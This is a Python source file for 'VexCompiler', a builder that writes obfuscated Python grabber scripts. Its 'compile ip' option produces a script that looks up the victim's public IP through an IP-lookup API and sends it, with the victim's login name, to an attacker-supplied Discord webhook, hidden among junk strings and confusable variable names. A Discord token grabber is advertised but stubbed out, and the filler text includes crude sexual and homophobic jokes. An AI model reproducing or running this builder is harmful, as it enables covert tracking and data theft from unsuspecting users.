# Libraries ======================+
import os
import time
import sys
import requests

import random
from colorama import Fore

# OnLaunch ========================+
if sys.platform == "linux" or sys.platform == "linux2":
    osys = "linux"
elif sys.platform == "darwin":
    osys = "osx"
elif sys.platform == "win32":
    osys = "win"

if osys == "win":
    os.system(f"title VexCompiler / Welcome, {os.getlogin()} (Ver. Windows)")

# Variables =======================+
desc = [
    "vex >> vw",
    "hello, "+os.getlogin(),
    "remember that one time "+os.getlogin()+" used VexLog",
    "https://discord.gg/YHynjFuH6v",
    "i hope your having a good day",
    os.getlogin()+"is cute"
]

# Functions =======================+


def error(string):
    print(f"{Fore.RED}[x]: {Fore.LIGHTRED_EX}{string}\n")


def warn(string):
    print(f"{Fore.YELLOW}[/]: {Fore.LIGHTYELLOW_EX}{string}\n")


def info(string):
    print(f"{Fore.BLUE}[i]: {Fore.LIGHTBLUE_EX}{string}\n")


def cls():
    if osys == "linux":
        os.system("clear")
    elif osys == "osx":
        os.system("clear")
    elif osys == "win":
        os.system("cls")


def checkconfig():
    if not os.path.exists("Compiled"):
        config = os.mkdir("Compiled")


def banner():
    print(Fore.LIGHTBLACK_EX+f"""                            
█░█ █▀▀ ▀▄▀ ░░▄▀ █▀▀ █▀█ █▀▄▀█ █▀█ █ █░░ █▀▀ █▀█
▀▄▀ ██▄ █░█ ▄▀░░ █▄▄ █▄█ █░▀░█ █▀▀ █ █▄▄ ██▄ █▀▄
2 Types of compiles / 2 Loggers / {random.choices(desc)}
    """)


# Vex Logger ======================+
cls()
banner()
warn("This can get you banned from discord\nStay safe")
info("Type compilers for all compiled scripts")

def vexcm():

    # Command Input
    cmd = input(Fore.YELLOW+f"Compile %\n{Fore.LIGHTBLACK_EX}")

    # Return Command
    if cmd.lower() == "compile ip":
        checkconfig()
        filename = input(Fore.YELLOW+f"File Name: {Fore.LIGHTBLACK_EX}")
        webhook = input(Fore.YELLOW+f"Webhook: {Fore.LIGHTBLUE_EX}")
        print(Fore.WHITE+"[0]: Semi-Securing webhook link")
        sechook = webhook.split("/")
        print("[0a]: Splitting Webhook")
        print("[0b]: Finished Webhook Splitting // basically made secure a lil")
        newlog = open(f"Compiled/{filename}"+".py", "w+")
        print("[1]: Getting random strings/booleans")
        randomstrings = ["dex.lol#1337", "project vex", "woow such a good obfuscator",
        "femor when he sees unsucked dick", "hello all", "vex >> vw", "@everyone",
        "i admit this is not a good compiler", "bruhhhh", "the creator of this is cute",
        "honestlyyyyy", "music is very good for you", "i dont like emos", "hendricko",
        "https://www.youtube.com/channel/UCaEg8bVgAJbVqglXbwulyWw", "buu lol",
        "gthdusibhtn7854y67b8rsbhtjk", "one two three four five six seven eight",
        "insert extreeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeemely long text here",
        "h... h... h... h... h... h... h...", "where my boi hendricko", "stop hacking hacker!!",
        "why you gotta be muted", "the hdmi port that does hdmi when hdmi like hdmi so hdmi port hdmi's the speaker hdmi",
        "brah", "i wonder why your using this unless i sent you it", "maybe i just released it on github",
        "i triedd my very hardest on this i think", "hello there pentagonium", "pls stop using ur soundboard",
        "im inside your walls.", "pass","vex", "              "]
        randombools = ["vex = True", "gay = False", "femorgay = True", 
        "funstuff = True", "compiler = True"]
        russo = ["здравствуйте", "Украина", "остановить третью мировую войну",
        "я думаю, что у меня есть чувства к человеку, использующему этот сценарий прямо сейчас",
        "в моем классе есть русская девочка", "мне нравится русский язык, это интересно",
        "хорошо, grammarly, мне не нужна твоя помощь", "упс, немного английского проскользнуло"]

        print("[2]: Writing File")
        newlog.write(f"""
#  ================================
# |         Dex's Compiler         |
#  ================================
#  Please do not mess with the code
#  Reach me on discord dex.lol#1337

'''dex.lol#1377'''
'''''';{random.choices(russo)};{random.choices(randombools)};{random.choices(russo)};{random.choices(randombools)};{random.choices(randombools)};{random.choices(randombools)};{random.choices(russo)};{random.choices(randombools)};{random.choices(randombools)};{random.choices(russo)};{random.choices(randombools)};{random.choices(russo)};''''''
'''{random.choices(randomstrings)}''';import os;import requests;'''{random.choices(randombools)}''';import dhooks;{random.choices(randomstrings)}
'''{random.choices(russo)}''';dexIlIlIlIlllIllIIIIllIlIlI="ht";{random.choices(russo)}
'''{random.choices(russo)}''';dexIlIlIlIllllllIIIIllIlIlI="ipify";l2="{sechook[2]+"/"}";{random.choices(randombools)};''''{random.choices(randomstrings)}'''
'''{random.choices(russo)}''';k="";dexIlIlIlIlIIlllIIIIllIlIlI=requests.get;'''{random.choices(randomstrings)}''';l6="{sechook[6]}";{random.choices(randomstrings)}
'''{random.choices(randomstrings)}''';{random.choices(russo)};{random.choices(randombools)};{random.choices(randombools)};'''dexIIIlIlIlllIllIIIIllIlIII'''
'''{random.choices(randomstrings)} ''';dexIlIlIlIlllIllIIIIllIlIll="api.";user=os.getlogin();{random.choices(randombools)};l3="{sechook[3]+"/"}";dexIlIlIlIllllllIIIIllIIllIlI=dhooks.Webhook;'''{random.choices(russo)}'''
'''{random.choices(randomstrings)}''';dexIlIlIlIlllIllIIIIIIIIII=requests;'''voidwatch is gay'''
'''{random.choices(russo)}''';l0="{sechook[0]+"//"}";{random.choices(randomstrings)};{random.choices(randombools)};l4="{sechook[4]+"/"}";'''{random.choices(russo)}''';'''dexIIIlIlIlllIllIIIIllIlIII''';'''{random.choices(randomstrings)}''';{random.choices(randombools)};{random.choices(russo)}
'''{random.choices(randomstrings)}''';{random.choices(randomstrings)};'''{random.choices(randomstrings)}''';dexIlIlIlIlllIllIIIIlIIIIII="org";'''{random.choices(randomstrings)}''';'''femor when unsucked cock is in there area'''
'''{random.choices(randomstrings)} {random.choices(russo)}''';'''dexIIIlIlI''';l5="{sechook[5]+"/"}";dexIlIlIlIlllIllIlIIllIlIll=dexIlIlIlIllllllIIIIllIIllIlI(l0+l2+l3+l4+l5+l6);'''lllIllIIIIllIlIII''';'''er''';''''''
'''{random.choices(russo)} ''';dex_gay=False;'''{random.choices(randomstrings)}''';{random.choices(russo)};dexIlIlIlIlllIllIIIIllIlIII="tps";'''dex was here'''
'''{random.choices(randomstrings)} {random.choices(randomstrings)}''';{random.choices(randombools)};{random.choices(randomstrings)};'''{random.choices(randomstrings)}'''
'''{random.choices(randomstrings)}''';dexIIIlIlIlllIllIIIIllIlIII=dexIlIlIlIlIIlllIIIIllIlIlI(dexIlIlIlIlllIllIIIIllIlIlI+dexIlIlIlIlllIllIIIIllIlIII+'://'+dexIlIlIlIlllIllIIIIllIlIll+dexIlIlIlIllllllIIIIllIlIlI+'.'+dexIlIlIlIlllIllIIIIlIIIIII).text;'''{random.choices(randomstrings)}'''
'''{random.choices(russo)} ''';{random.choices(randombools)};dexIlIlIlIlllIllIlIIllIlIll.send(user+": "+dexIIIlIlIlllIllIIIIllIlIII);'''{random.choices(randomstrings)}''';pass;{random.choices(randombools)}
'''''';{random.choices(russo)};{random.choices(randomstrings)};{random.choices(russo)};{random.choices(russo)};{random.choices(russo)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(russo)};''''''
'''dex.lol#1337'''
        """)
        print("[/]: File Compiled, sent to Compiled Folder")
        newlog.close()
    elif cmd.lower() == "compile token":
        pass
    elif cmd.lower() == "compile all": 
        pass
    elif cmd.lower() == "compilers":
        print(f"""
=======================================
Vex Compiler Commands | {random.choices(desc)}
---------------------------------------
[0]: compile ip - compiles a script to
                  grab a targets ip

[1]: compile token - compiles a script
                     to grab a targets
                     token

[2]: compile all - compiles all scripts
=======================================
        """)
    elif cmd.lower() == "cls" or cmd.lower() == "clear":
        cls()
        banner()
    else:
        error("Unknown command, try again.")

    # Loop Compiler
    vexcm()
    
vexcm()
